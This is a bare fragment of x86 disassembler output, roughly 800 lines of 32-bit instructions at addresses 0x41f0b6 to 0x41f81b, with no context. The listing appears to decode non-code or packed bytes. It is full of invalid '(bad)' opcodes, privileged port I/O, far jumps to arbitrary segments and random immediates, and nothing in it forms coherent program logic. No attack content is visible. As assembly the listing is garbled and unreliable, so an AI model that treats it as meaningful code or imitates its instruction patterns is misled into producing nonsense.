  41f0b6:	dec    ebp
  41f0b7:	jno    0x41f0db
  41f0b9:	xchg   ebx,eax
  41f0ba:	pusha  
  41f0bb:	xchg   edx,eax
  41f0bc:	push   ds
  41f0bd:	mov    esi,0xbb62bd45
  41f0c2:	loope  0x41f0c2
  41f0c4:	lods   al,BYTE PTR ds:[esi]
  41f0c5:	inc    ebp
  41f0c6:	scas   al,BYTE PTR es:[edi]
  41f0c7:	lods   al,BYTE PTR ds:[esi]
  41f0c8:	mov    BYTE PTR [esp+ebp*4+0x75b41187],bh
  41f0cf:	push   ecx
  41f0d0:	fwait
  41f0d1:	stos   BYTE PTR es:[edi],al
  41f0d2:	cwde   
  41f0d3:	push   ds
  41f0d4:	pop    ecx
  41f0d5:	rol    DWORD PTR [ecx-0x14],0xb1
  41f0d9:	push   edx
  41f0da:	(bad)  
  41f0db:	in     al,dx
  41f0dc:	cwde   
  41f0dd:	jl     0x41f0c3
  41f0df:	dec    edx
  41f0e0:	jp     0x41f0f8
  41f0e2:	xchg   BYTE PTR [esi+0x990653a],cl
  41f0e8:	mov    eax,0xb82baed7
  41f0ed:	sub    al,BYTE PTR [edx]
  41f0ef:	push   ds
  41f0f0:	loopne 0x41f0f6
  41f0f2:	loopne 0x41f146
  41f0f4:	inc    ebp
  41f0f5:	push   ebx
  41f0f6:	push   0xb840506c
  41f0fb:	xchg   ebp,eax
  41f0fc:	push   ebp
  41f0fd:	(bad)  
  41f0ff:	cmp    eax,0xa0ea59eb
  41f104:	inc    eax
  41f105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f106:	jle    0x41f13b
  41f108:	jp     0x41f0cf
  41f10a:	shl    BYTE PTR [ecx+0x128f19d],0x7d
  41f111:	icebp  
  41f112:	jns    0x41f110
  41f114:	test   al,0xf4
  41f116:	loop   0x41f15c
  41f118:	cli    
  41f119:	mov    DWORD PTR [esp+ebx*4],ebx
  41f11c:	xor    al,0x34
  41f11e:	lds    edx,FWORD PTR [ecx-0x25]
  41f121:	fisubr DWORD PTR [esi]
  41f123:	repnz or al,0x6a
  41f126:	pop    esp
  41f127:	push   es
  41f128:	fcomp  DWORD PTR [edx]
  41f12a:	push   cs
  41f12b:	fiadd  DWORD PTR [ebx+0x3c42c9ad]
  41f131:	sub    DWORD PTR [ebx+0x64],edi
  41f134:	pop    edx
  41f135:	popa   
  41f136:	sbb    bh,dh
  41f138:	pop    esp
  41f139:	adc    BYTE PTR [ebp+0x7c],dh
  41f13c:	pop    ds
  41f13d:	cmc    
  41f13e:	jne    0x41f188
  41f140:	arpl   WORD PTR [ecx-0x7d0da7fb],si
  41f146:	ins    BYTE PTR es:[edi],dx
  41f147:	inc    ebp
  41f148:	retf   0x41fe
  41f14b:	mov    dl,0x2
  41f14d:	lock fsubr QWORD PTR [esp+ebx*4+0x6a]
  41f153:	mov    eax,0x1287986b
  41f158:	addr16 cmp al,0x73
  41f15b:	mov    ss,edi
  41f15d:	cdq    
  41f15e:	fadd   DWORD PTR [ebp+0x2bf6cf4e]
  41f164:	cdq    
  41f165:	lahf   
  41f166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f167:	sub    dl,BYTE PTR [eax+0x3d]
  41f16a:	or     eax,esi
  41f16c:	pop    es
  41f16d:	xor    esp,eax
  41f16f:	mov    dh,0xeb
  41f171:	dec    ebp
  41f172:	sub    al,0x53
  41f174:	dec    edx
  41f175:	dec    esi
  41f176:	fwait
  41f177:	pop    es
  41f178:	cli    
  41f179:	jge    0x41f1e4
  41f17b:	(bad)  {k2}
  41f180:	adc    BYTE PTR [edi-0x7d112cb1],ah
  41f186:	cmp    al,BYTE PTR [edi+0x3]
  41f189:	mov    BYTE PTR [esi+ebp*2],bh
  41f18c:	xchg   BYTE PTR [eax+eax*4],ah
  41f18f:	lods   eax,DWORD PTR ds:[esi]
  41f190:	pushf  
  41f191:	repz sbb al,0xdc
  41f194:	ficom  WORD PTR [eax-0x5e1e3289]
  41f19a:	repnz fs inc ebx
  41f19d:	pusha  
  41f19e:	xor    al,0xf4
  41f1a0:	adc    DWORD PTR [edi+edx*1+0x324f891],0x22ff7eb6
  41f1ab:	jmp    0x1984:0x67723f61
  41f1b2:	adc    DWORD PTR [ebx-0x6],edx
  41f1b5:	xor    dh,BYTE PTR [ebx-0x469720ad]
  41f1bb:	xor    edx,DWORD PTR [eax-0x5b]
  41f1be:	pop    edi
  41f1bf:	pop    es
  41f1c0:	sti    
  41f1c1:	xchg   DWORD PTR fs:[edx],edx
  41f1c4:	outs   dx,DWORD PTR cs:[esi]
  41f1c6:	fisttp WORD PTR [edx]
  41f1c9:	pushf  
  41f1ca:	mov    eax,0x730808b7
  41f1cf:	mov    ebx,0xd4b736e2
  41f1d5:	or     esi,DWORD PTR [eax-0x7a703e17]
  41f1db:	(bad)  
  41f1dc:	sbb    ah,BYTE PTR [eax+0x577c7707]
  41f1e2:	(bad)  
  41f1e3:	(bad)  
  41f1e4:	adc    eax,edx
  41f1e6:	cmp    cl,BYTE PTR [edx]
  41f1e8:	iret   
  41f1e9:	inc    esi
  41f1ea:	sbb    al,0x44
  41f1ec:	iret   
  41f1ed:	int    0x29
  41f1ef:	dec    DWORD PTR [edi]
  41f1f1:	ror    ebx,1
  41f1f3:	test   DWORD PTR [ecx-0x27a9a663],edi
  41f1f9:	ret    
  41f1fa:	or     al,0x54
  41f1fc:	in     eax,0x81
  41f1fe:	maskmovq mm7,(bad)
  41f1ff:	idiv   DWORD PTR [ebp-0x42]
  41f202:	cmp    eax,0x62b107fa
  41f207:	aas    
  41f208:	mov    al,0x3d
  41f20a:	in     al,0xff
  41f20c:	dec    esi
  41f20d:	ret    0xa645
  41f210:	cmp    esp,DWORD PTR [esi]
  41f212:	xor    dh,ch
  41f214:	add    DWORD PTR [ebp+0x40],0x62ebfad2
  41f21b:	pop    ecx
  41f21c:	jmp    0x41f213
  41f21e:	dec    ecx
  41f21f:	fwait
  41f220:	dec    edi
  41f221:	aas    
  41f222:	std    
  41f223:	mov    eax,ds:0x219d5bf5
  41f228:	pop    edx
  41f229:	push   ds
  41f22a:	addr16 hlt 
  41f22c:	(bad)  
  41f22d:	fs ins DWORD PTR es:[edi],dx
  41f22f:	loope  0x41f23e
  41f231:	clc    
  41f232:	out    0xb8,eax
  41f234:	mov    cl,0xfc
  41f236:	or     al,0xdd
  41f238:	inc    esp
  41f239:	push   ebp
  41f23a:	xor    BYTE PTR [eax],ah
  41f23c:	repnz sub BYTE PTR ds:0x1e31d172,dh
  41f243:	popf   
  41f244:	adc    DWORD PTR [esi+0x5c],eax
  41f247:	inc    esi
  41f248:	mov    ah,0x2b
  41f24a:	push   ecx
  41f24b:	enter  0x7d25,0xfb
  41f24f:	inc    ebx
  41f250:	and    al,0xc0
  41f252:	test   edx,ebx
  41f254:	retf   
  41f255:	mov    bh,0xd6
  41f257:	out    0xea,al
  41f259:	xchg   ecx,eax
  41f25a:	fwait
  41f25b:	sahf   
  41f25c:	jno    0x41f235
  41f25e:	xor    DWORD PTR [ebx],edx
  41f260:	xor    al,0x4b
  41f262:	data16 out 0x40,al
  41f265:	jae    0x41f222
  41f267:	xlat   BYTE PTR ds:[ebx]
  41f268:	pop    es
  41f269:	jbe    0x41f215
  41f26b:	cmp    BYTE PTR [eax+esi*1-0x2b],0x5a
  41f270:	hlt    
  41f271:	pop    ss
  41f272:	dec    esi
  41f273:	jecxz  0x41f225
  41f275:	mov    dl,0x8
  41f277:	push   ss
  41f278:	inc    ecx
  41f279:	shl    DWORD PTR [eax],0x22
  41f27c:	push   es
  41f27d:	out    dx,eax
  41f27e:	jnp    0x41f21f
  41f280:	xor    BYTE PTR [edx+0x62],ah
  41f283:	dec    eax
  41f284:	add    BYTE PTR [eax+0x1f],bh
  41f287:	xchg   ebx,eax
  41f288:	xor    eax,0x2777a327
  41f28d:	mov    al,0x52
  41f28f:	les    eax,FWORD PTR [esi+eiz*8-0x6d358193]
  41f296:	les    ecx,FWORD PTR [ecx-0x74]
  41f299:	or     eax,0x20a83163
  41f29e:	call   0xfc45:0x6f086bbb
  41f2a5:	pextrw ebp,(bad),0xc5
  41f2a7:	test   al,0x28
  41f2a9:	aas    
  41f2aa:	lods   al,BYTE PTR ds:[esi]
  41f2ab:	push   esp
  41f2ac:	ins    BYTE PTR es:[edi],dx
  41f2ad:	into   
  41f2ae:	dec    edx
  41f2af:	dec    esi
  41f2b0:	mov    bh,BYTE PTR [ebx]
  41f2b2:	jae    0x41f2b8
  41f2b4:	cld    
  41f2b5:	jle    0x41f31a
  41f2b7:	pop    edx
  41f2b8:	fisubr WORD PTR [edi-0x75703262]
  41f2be:	vmovupd xmm5,XMMWORD PTR [ecx-0x1f]
  41f2c3:	lahf   
  41f2c4:	out    dx,al
  41f2c5:	adc    ch,BYTE PTR [edi-0x56be9290]
  41f2cb:	mov    edx,gs
  41f2cd:	fdiv   DWORD PTR [eax]
  41f2cf:	iret   
  41f2d0:	cli    
  41f2d1:	aad    0x5d
  41f2d3:	fs jo  0x41f265
  41f2d6:	dec    ebx
  41f2d7:	add    ah,BYTE PTR [ebx+ecx*2-0x73]
  41f2db:	dec    ebx
  41f2dc:	push   ecx
  41f2dd:	(bad)  
  41f2df:	pop    ebx
  41f2e0:	test   al,0x53
  41f2e2:	jae    0x41f285
  41f2e4:	and    BYTE PTR [esi-0x41],ch
  41f2e7:	(bad)  
  41f2e8:	adc    dl,BYTE PTR [edx-0x4240d738]
  41f2ee:	fsub   QWORD PTR [ebp+0x0]
  41f2f1:	inc    ebx
  41f2f2:	or     DWORD PTR [esi+0x5c7b2577],esp
  41f2f8:	bound  ebp,QWORD PTR [esi+0x4f3db514]
  41f2fe:	and    al,0x48
  41f300:	mov    ds,esp
  41f302:	inc    eax
  41f303:	mov    ecx,0xac69f995
  41f308:	mov    ebp,0x1577f334
  41f30d:	or     al,0xf7
  41f30f:	lea    eax,[edx-0x7f]
  41f312:	xchg   eax,eax
  41f314:	(bad)  
  41f315:	aad    0xe4
  41f317:	stos   DWORD PTR es:[edi],eax
  41f318:	fwait
  41f319:	sub    eax,0x1c7f29e6
  41f31e:	jo     0x41f32f
  41f320:	fistp  WORD PTR [ebx]
  41f322:	mov    ah,0xb
  41f324:	rol    DWORD PTR [eax+0x4b],0x65
  41f328:	ins    BYTE PTR es:[edi],dx
  41f329:	mov    edx,0x4faad1fb
  41f32e:	rol    DWORD PTR [ebx-0x28],0x65
  41f332:	xchg   BYTE PTR [ecx-0x66],bh
  41f335:	and    al,0x66
  41f337:	inc    ebx
  41f338:	popf   
  41f339:	adc    DWORD PTR [ebp-0x16],0xcb5d806b
  41f340:	mov    bl,0x61
  41f342:	pop    esp
  41f343:	and    eax,DWORD PTR [edi-0x7d]
  41f346:	adc    edi,ecx
  41f348:	push   ecx
  41f349:	jns    0x41f2e0
  41f34b:	push   esi
  41f34c:	fisubr WORD PTR [edx+0x34]
  41f34f:	daa    
  41f350:	(bad)  
  41f351:	xchg   esp,eax
  41f352:	out    0xe1,eax
  41f354:	js     0x41f379
  41f356:	jb     0x41f362
  41f358:	out    0x8,eax
  41f35a:	or     al,BYTE PTR [esp+ebp*8-0x6555c371]
  41f361:	push   0x3272b8aa
  41f366:	pushf  
  41f367:	sbb    edi,edx
  41f369:	cmp    DWORD PTR [edx+0x73],esi
  41f36c:	je     0x41f38a
  41f36e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f36f:	(bad)  
  41f370:	cmp    DWORD PTR [ebx+0x64ab7873],esi
  41f376:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41f378:	mov    ah,0x2d
  41f37a:	push   esi
  41f37b:	sbb    DWORD PTR [ebx-0x33],0x4177872d
  41f382:	ja     0x41f389
  41f384:	add    ch,ah
  41f386:	dec    edx
  41f387:	aam    0x4d
  41f389:	fbstp  TBYTE PTR [ebx+0x4aaad42f]
  41f38f:	imul   ebp,eax,0x1b
  41f392:	jne    0x41f3ae
  41f394:	and    eax,0xe9a341c4
  41f399:	sub    DWORD PTR [edx+0x22],ecx
  41f39c:	ins    DWORD PTR es:[edi],dx
  41f39d:	rcr    ah,cl
  41f39f:	and    eax,0xb71e0f27
  41f3a4:	mov    ebp,DWORD PTR [esi+0x7a]
  41f3a7:	stos   DWORD PTR es:[edi],eax
  41f3a8:	in     al,0x71
  41f3aa:	addr16 and esp,edx
  41f3ad:	push   0xb9dec909
  41f3b2:	and    BYTE PTR [esi+0x22],dh
  41f3b5:	(bad)  
  41f3b6:	repz test eax,0xce4b77b
  41f3bd:	test   eax,0xfa07192d
  41f3c2:	sub    eax,0xb18989ca
  41f3c7:	ins    DWORD PTR es:[edi],dx
  41f3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3c9:	rcl    BYTE PTR [ebx],cl
  41f3cb:	les    ebp,FWORD PTR [ebp+0x18]
  41f3ce:	jge    0x41f363
  41f3d0:	call   0xdc05:0x52bbb096
  41f3d7:	popf   
  41f3d8:	pop    edx
  41f3d9:	xor    eax,0x56db2435
  41f3de:	cmc    
  41f3df:	loop   0x41f3ba
  41f3e1:	in     al,dx
  41f3e2:	jp     0x41f441
  41f3e4:	clc    
  41f3e5:	pop    ebp
  41f3e6:	mov    ah,0x2b
  41f3e8:	pop    ebp
  41f3e9:	push   ss
  41f3ea:	adc    bl,cl
  41f3ec:	pushf  
  41f3ed:	pushf  
  41f3ee:	call   0x653f:0xb3b53ac6
  41f3f5:	or     BYTE PTR [edi+ebx*4+0x490896e1],0x83
  41f3fd:	ficom  DWORD PTR [ecx+eax*8+0x50619cc2]
  41f404:	ja     0x41f40c
  41f406:	dec    eax
  41f407:	imul   esp,ecx,0xffffffe1
  41f40a:	fnstenv [ebx-0x8]
  41f40d:	call   0xa0d4a4e5
  41f412:	cmp    DWORD PTR [eax+ebp*1],0x4dc0c22f
  41f419:	mov    fs,eax
  41f41b:	addr16 dec esp
  41f41d:	jno    0x41f457
  41f41f:	pushf  
  41f420:	push   ecx
  41f421:	pop    eax
  41f422:	cmp    esi,DWORD PTR [ebp-0x7256436b]
  41f428:	das    
  41f429:	dec    BYTE PTR [ecx+eax*8+0x72]
  41f42d:	stc    
  41f42e:	fiadd  DWORD PTR [esi+ebp*2-0x563c33c4]
  41f435:	add    al,0x59
  41f437:	rol    BYTE PTR [edx],1
  41f439:	push   eax
  41f43a:	shl    DWORD PTR [eax],cl
  41f43c:	sbb    cl,BYTE PTR [ecx]
  41f43e:	push   ds
  41f43f:	popa   
  41f440:	mov    ah,0xcf
  41f442:	mov    ah,0xeb
  41f444:	cmp    eax,0x990c3994
  41f449:	ss int3 
  41f44b:	adc    al,0x45
  41f44d:	push   edi
  41f44e:	inc    edx
  41f44f:	xchg   BYTE PTR [edx],ch
  41f451:	daa    
  41f452:	out    dx,al
  41f453:	xchg   edi,eax
  41f454:	jnp    0x41f3d7
  41f456:	ss jecxz 0x41f446
  41f459:	jl     0x41f3e5
  41f45b:	mov    cs,WORD PTR [esi]
  41f45d:	mov    eax,0x356c4351
  41f462:	hlt    
  41f463:	lods   al,BYTE PTR ds:[esi]
  41f464:	dec    edi
  41f465:	lock pop ss
  41f467:	loopne 0x41f40d
  41f469:	add    eax,DWORD PTR [eax+0x57]
  41f46c:	fcomi  st,st(4)
  41f46e:	bound  ecx,QWORD PTR cs:[eax]
  41f471:	shl    DWORD PTR [esi+0x11],0xd2
  41f475:	mov    cl,0xc3
  41f477:	sbb    esi,DWORD PTR [ebx+0x5a]
  41f47a:	mov    al,ds:0xefd47cab
  41f47f:	xor    BYTE PTR [ebx-0x11],0x11
  41f483:	mov    ebx,0xbaec2f4f
  41f488:	fsubrp st(2),st
  41f48a:	test   al,0x5b
  41f48c:	or     al,0xe6
  41f48e:	cwde   
  41f48f:	pop    eax
  41f490:	add    BYTE PTR ds:0x6b5b5247,0xe7
  41f497:	sbb    BYTE PTR [edx+0x3c],0x2e
  41f49b:	pop    eax
  41f49c:	mov    BYTE PTR [edx+edi*4-0x72ab8d36],ch
  41f4a3:	sub    bl,BYTE PTR [ecx+0x0]
  41f4a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4a7:	aad    0xc9
  41f4a9:	and    DWORD PTR [ebp+eiz*2+0x75],esp
  41f4ad:	sub    DWORD PTR ds:0x7cdbde0,ebx
  41f4b3:	mov    edx,0x273a7a30
  41f4b8:	inc    ebx
  41f4b9:	sub    al,0x34
  41f4bb:	or     BYTE PTR [esi+0x5c],bl
  41f4be:	popf   
  41f4bf:	pop    edx
  41f4c0:	out    0x37,eax
  41f4c2:	clc    
  41f4c3:	ror    BYTE PTR [ebx+esi*1],0xd9
  41f4c7:	xchg   edx,eax
  41f4c8:	call   0xe520:0x3ea010a8
  41f4cf:	sti    
  41f4d0:	lea    edx,[esi+0xb]
  41f4d3:	outs   dx,BYTE PTR ds:[esi]
  41f4d4:	inc    eax
  41f4d5:	pusha  
  41f4d6:	test   ecx,ecx
  41f4d8:	test   eax,0x37ace112
  41f4dd:	sbb    DWORD PTR [ebp-0x20675542],0x5d77bd8d
  41f4e7:	mov    ?,edx
  41f4e9:	inc    esp
  41f4ea:	jmp    0xf306:0x6a0e4e39
  41f4f1:	int3   
  41f4f2:	inc    ebx
  41f4f3:	popa   
  41f4f4:	xchg   esp,eax
  41f4f5:	(bad)  
  41f4f6:	movsx  edi,di
  41f4f9:	cmp    DWORD PTR [esi],esp
  41f4fb:	mov    esi,0x1d80cf0
  41f500:	push   ebp
  41f501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f502:	pop    edi
  41f503:	jmp    0x41f4c1
  41f505:	(bad)  ds:0x6403fee
  41f50b:	rcl    edi,1
  41f50d:	lock sub edi,DWORD PTR [ecx]
  41f510:	xlat   BYTE PTR ds:[ebx]
  41f511:	cmp    BYTE PTR [edi],dl
  41f513:	stos   DWORD PTR es:[edi],eax
  41f514:	bound  eax,QWORD PTR [eax-0x6ffc51f4]
  41f51a:	test   eax,0x31dd8be8
  41f51f:	push   es
  41f520:	(bad)  [edi+0x4]
  41f523:	or     eax,0xbb85945d
  41f528:	cdq    
  41f529:	sub    eax,0xb56dcf22
  41f52e:	retf   
  41f52f:	bound  eax,QWORD PTR [eax+0x1]
  41f532:	mov    eax,ds:0x62a6fcae
  41f537:	repz fcomp DWORD PTR [ecx-0x62]
  41f53b:	pop    es
  41f53c:	outs   dx,DWORD PTR ds:[esi]
  41f53d:	in     eax,dx
  41f53e:	pushf  
  41f53f:	jecxz  0x41f589
  41f541:	mov    dl,0xa6
  41f543:	retf   
  41f544:	pop    esp
  41f545:	pop    esp
  41f546:	pop    ebp
  41f547:	mov    esp,0x19f042b5
  41f54c:	aaa    
  41f54d:	sbb    dh,dh
  41f54f:	ins    DWORD PTR es:[edi],dx
  41f550:	push   ds
  41f551:	mov    WORD PTR ss:[ecx+0x43],gs
  41f555:	push   ds
  41f556:	gs adc dl,bh
  41f559:	int    0xf2
  41f55b:	mul    cl
  41f55d:	inc    edi
  41f55e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f55f:	xchg   edi,eax
  41f560:	mov    ebp,0xf197634
  41f565:	out    0x78,al
  41f567:	sar    DWORD PTR [ecx-0x377c140a],cl
  41f56d:	lods   eax,DWORD PTR ds:[esi]
  41f56e:	lods   eax,DWORD PTR ds:[esi]
  41f56f:	(bad)  
  41f570:	les    esi,FWORD PTR [eax-0x136f35e9]
  41f576:	cs xchg edx,eax
  41f578:	in     eax,0x96
  41f57a:	sbb    al,0x26
  41f57c:	sbb    DWORD PTR [edx+0x3d2b4540],eax
  41f582:	jecxz  0x41f5a8
  41f584:	mov    esi,gs
  41f586:	mov    esi,0x58d95ab7
  41f58b:	inc    edi
  41f58c:	ss adc al,ch
  41f58f:	lock sub cl,BYTE PTR [edx]
  41f592:	fcom   QWORD PTR [ebx+0x63]
  41f595:	nop
  41f596:	jo     0x41f612
  41f598:	mov    ebp,0x9fba3b33
  41f59d:	call   0xe5c0:0xe893c4b6
  41f5a4:	mov    edx,0x49d7c31f
  41f5a9:	mov    ch,0xc
  41f5ab:	pushf  
  41f5ac:	daa    
  41f5ad:	pushf  
  41f5ae:	test   eax,0xf995a789
  41f5b3:	jmp    0xcf0:0xe11fcfba
  41f5ba:	cmp    eax,DWORD PTR [ebp-0x6b39cec4]
  41f5c0:	in     eax,dx
  41f5c1:	and    BYTE PTR [edx-0x5c],bh
  41f5c4:	cmp    DWORD PTR [ecx],eax
  41f5c6:	sbb    cl,BYTE PTR [edx]
  41f5c8:	shl    BYTE PTR [eax+0x49],1
  41f5cb:	xor    eax,0x6ec5303e
  41f5d0:	sub    eax,0x605bd848
  41f5d5:	mov    ebx,0x31dcfb4c
  41f5da:	lock push esp
  41f5dc:	jb     0x41f617
  41f5de:	inc    ebx
  41f5df:	sub    ebx,DWORD PTR [edx]
  41f5e1:	sbb    DWORD PTR [ebx+0x58e6bd7c],edi
  41f5e7:	jmp    0x56f1:0xf813fa5a
  41f5ee:	mov    esi,0xb5690841
  41f5f3:	pcmpeqb mm1,QWORD PTR [ecx+0x6]
  41f5f7:	adc    DWORD PTR [eax+0x24698d80],ebp
  41f5fd:	inc    esi
  41f5fe:	cmp    DWORD PTR [edx+0xd],esi
  41f601:	add    al,0x16
  41f603:	pop    edx
  41f604:	idiv   BYTE PTR [ebx]
  41f606:	add    al,0xb4
  41f608:	adc    eax,0x7cb3aa49
  41f60d:	lods   al,BYTE PTR ds:[esi]
  41f60e:	push   ebx
  41f60f:	or     eax,0x9abfc4e8
  41f614:	dec    ecx
  41f615:	ror    DWORD PTR [esi-0x6f75aff7],cl
  41f61b:	push   edx
  41f61c:	mov    ?,WORD PTR [esi]
  41f61e:	add    eax,0xee96119c
  41f623:	push   ecx
  41f624:	jmp    0x8d5e:0x42cb0d6d
  41f62b:	inc    esi
  41f62c:	addr16 xchg esp,eax
  41f62e:	xchg   edi,eax
  41f62f:	push   ecx
  41f630:	and    eax,0xb8f9fe52
  41f635:	inc    edi
  41f636:	cmp    esp,DWORD PTR [ebp-0x20]
  41f639:	push   es
  41f63a:	or     ebp,ecx
  41f63c:	cs xchg esp,eax
  41f63e:	adc    al,0x8
  41f640:	push   edi
  41f641:	cmp    DWORD PTR [edx+0x21],edx
  41f644:	add    esi,DWORD PTR [edi]
  41f646:	ret    0xd9c
  41f649:	push   esi
  41f64a:	xor    dh,BYTE PTR [edi+0x69]
  41f64d:	sub    edi,DWORD PTR [ebp+0x21]
  41f650:	dec    edx
  41f651:	fild   DWORD PTR [ebp-0x1d]
  41f654:	lahf   
  41f655:	sar    ah,0xde
  41f658:	sbb    DWORD PTR [ebp+0x3b113392],esi
  41f65e:	cmp    BYTE PTR [eax-0x5a0e6f1c],bh
  41f664:	xor    al,0x66
  41f666:	ffree  st(3)
  41f668:	out    dx,al
  41f669:	and    ebx,ecx
  41f66b:	sbb    BYTE PTR [edx],ch
  41f66d:	jno    0x41f6d2
  41f66f:	iret   
  41f670:	inc    ebp
  41f671:	test   DWORD PTR [ecx-0x5],edi
  41f674:	jno    0x41f6c7
  41f676:	ins    DWORD PTR es:[edi],dx
  41f677:	(bad)  
  41f678:	in     al,0x6
  41f67a:	push   es
  41f67b:	cmp    al,0x23
  41f67d:	jge    0x41f687
  41f67f:	inc    esi
  41f680:	pop    ecx
  41f681:	test   al,0x25
  41f683:	push   eax
  41f684:	cmp    DWORD PTR [ebp-0x1a],0x4
  41f688:	adc    eax,0x3fa52ed
  41f68d:	jb     0x41f640
  41f68f:	push   0x1dfe39c3
  41f694:	and    esp,DWORD PTR [ecx]
  41f696:	sbb    DWORD PTR [eax-0x3a],eax
  41f699:	out    dx,al
  41f69a:	xor    ah,BYTE PTR [ebp-0x62]
  41f69d:	or     al,0x9d
  41f69f:	popa   
  41f6a0:	lods   al,BYTE PTR fs:[esi]
  41f6a2:	inc    esp
  41f6a3:	cmp    ch,BYTE PTR [esi-0x20]
  41f6a6:	xchg   esi,eax
  41f6a7:	sub    ebp,DWORD PTR ds:0x420a0dd9
  41f6ad:	ins    DWORD PTR es:[edi],dx
  41f6ae:	imul   ecx,DWORD PTR [ebp+eax*4+0x4d0fe94],0x53
  41f6b6:	dec    esp
  41f6b7:	dec    ecx
  41f6b8:	add    eax,0xc414a075
  41f6bd:	jle    0x41f682
  41f6bf:	rol    BYTE PTR [edx],1
  41f6c1:	jnp    0x41f6b6
  41f6c3:	and    al,0x6b
  41f6c5:	xor    eax,0x7e5a6144
  41f6ca:	add    cl,BYTE PTR [esi*2-0x713b289f]
  41f6d1:	xchg   ebp,eax
  41f6d2:	in     al,0x4f
  41f6d4:	repnz (bad) 
  41f6d6:	lods   al,BYTE PTR ds:[esi]
  41f6d7:	adc    BYTE PTR [edi-0x23],dh
  41f6da:	pushw  0x43
  41f6dd:	mov    cl,0xf6
  41f6df:	add    ecx,DWORD PTR [eax+0x8405bec]
  41f6e5:	idiv   BYTE PTR [ebx-0x10]
  41f6e8:	test   eax,0xf24feeb4
  41f6ed:	mov    dl,0x59
  41f6ef:	dec    edi
  41f6f0:	sbb    bh,BYTE PTR [ebx+0x55]
  41f6f3:	outs   dx,BYTE PTR ds:[esi]
  41f6f4:	xchg   esp,eax
  41f6f5:	jo     0x41f718
  41f6f7:	push   edx
  41f6f8:	adc    al,0x60
  41f6fa:	out    0xb7,eax
  41f6fc:	out    0x9f,al
  41f6fe:	out    dx,al
  41f6ff:	xchg   esi,eax
  41f700:	cmc    
  41f701:	jmp    0x723b:0x9e8ccb03
  41f708:	push   0x35
  41f70a:	jecxz  0x41f6e0
  41f70c:	mov    eax,0x517a7fd9
  41f711:	ret    0x9604
  41f714:	xchg   edi,eax
  41f715:	cmp    DWORD PTR [ebx-0x43],ebx
  41f718:	sub    eax,0x64b4ac20
  41f71d:	pop    ecx
  41f71e:	jl     0x41f78b
  41f720:	inc    esp
  41f721:	loope  0x41f729
  41f723:	int3   
  41f724:	dec    ebx
  41f725:	out    0x6a,al
  41f727:	jle    0x41f783
  41f729:	(bad)  
  41f72a:	pop    ebx
  41f72b:	xor    bl,BYTE PTR [eax-0x12]
  41f72e:	fs inc esi
  41f730:	into   
  41f731:	mov    ecx,es
  41f733:	push   eax
  41f734:	(bad)  
  41f735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f736:	dec    edx
  41f737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f738:	popfw  
  41f73a:	pop    ds
  41f73b:	add    edx,DWORD PTR [eax-0x6eb673ef]
  41f741:	jbe    0x41f79e
  41f743:	shl    BYTE PTR [esi+0x3912d0ee],cl
  41f749:	pop    ebp
  41f74a:	repnz pop edx
  41f74c:	or     esi,DWORD PTR [edi]
  41f74e:	and    edi,DWORD PTR [ecx+0x5d]
  41f751:	les    edx,FWORD PTR [esi+0x7]
  41f754:	cs shr bh,1
  41f757:	test   DWORD PTR [esp+ecx*8-0x1f],ecx
  41f75b:	nop
  41f75c:	mov    ch,0xee
  41f75e:	aas    
  41f75f:	inc    esp
  41f760:	mov    eax,ds:0x60455cce
  41f765:	xchg   edx,eax
  41f766:	mov    esp,ecx
  41f768:	aas    
  41f769:	call   0xfb84:0xd871d206
  41f770:	out    0x34,eax
  41f772:	push   ebx
  41f773:	xor    al,0x41
  41f775:	push   edi
  41f776:	int3   
  41f777:	int    0x94
  41f779:	cld    
  41f77a:	into   
  41f77b:	fcmovb st,st(1)
  41f77d:	add    BYTE PTR [ebp+ecx*8+0x37],0xfc
  41f782:	push   0x4
  41f784:	fyl2xp1 
  41f786:	xor    DWORD PTR [ecx-0x26c0006d],edx
  41f78c:	test   eax,0x80f290e1
  41f791:	pop    ds
  41f792:	aas    
  41f793:	push   esi
  41f794:	stc    
  41f795:	inc    esi
  41f796:	cwde   
  41f797:	sti    
  41f798:	test   DWORD PTR [edx-0x1fb5a1db],esi
  41f79e:	add    edx,edi
  41f7a0:	aas    
  41f7a1:	xor    DWORD PTR [eax-0x80],esi
  41f7a4:	xchg   BYTE PTR [ebx],bh
  41f7a6:	fidivr WORD PTR [edx]
  41f7a8:	sub    eax,0xe2058747
  41f7ad:	xchg   ecx,eax
  41f7ae:	mov    ecx,0x5c531553
  41f7b3:	adc    al,0x90
  41f7b5:	adc    eax,0xdcc63935
  41f7ba:	int3   
  41f7bb:	or     cl,dh
  41f7bd:	sub    ch,ch
  41f7bf:	icebp  
  41f7c0:	shr    DWORD PTR [edx],0xdc
  41f7c3:	cmp    eax,0x19bf865b
  41f7c8:	jge    0x41f7e8
  41f7ca:	into   
  41f7cb:	daa    
  41f7cc:	ins    DWORD PTR es:[edi],dx
  41f7cd:	sub    ah,BYTE PTR ds:0x3e8e70bd
  41f7d3:	add    al,0xc9
  41f7d5:	pop    es
  41f7d6:	imul   edx
  41f7d8:	outs   dx,DWORD PTR ds:[esi]
  41f7d9:	fs js  0x41f80e
  41f7dc:	pushf  
  41f7dd:	(bad)  
  41f7de:	jle    0x41f7c4
  41f7e0:	push   esp
  41f7e1:	cdq    
  41f7e2:	outs   dx,BYTE PTR ds:[esi]
  41f7e3:	add    dl,BYTE PTR [esi+0x268f88f2]
  41f7e9:	jo     0x41f794
  41f7eb:	xor    dh,BYTE PTR [ebp+ebx*1+0x450a7208]
  41f7f2:	pop    edi
  41f7f3:	pop    ss
  41f7f4:	adc    ebp,DWORD PTR [ecx+ebx*4+0x431909f0]
  41f7fb:	loop   0x41f879
  41f7fd:	jmp    0x7151:0xa7796309
  41f804:	shr    BYTE PTR [ecx-0x68906b7d],0xa8
  41f80b:	fist   DWORD PTR [ebx+0x599297b5]
  41f811:	mov    ds:0x1d457fb9,eax
  41f816:	xor    eax,0x432afb32
  41f81b:	into   
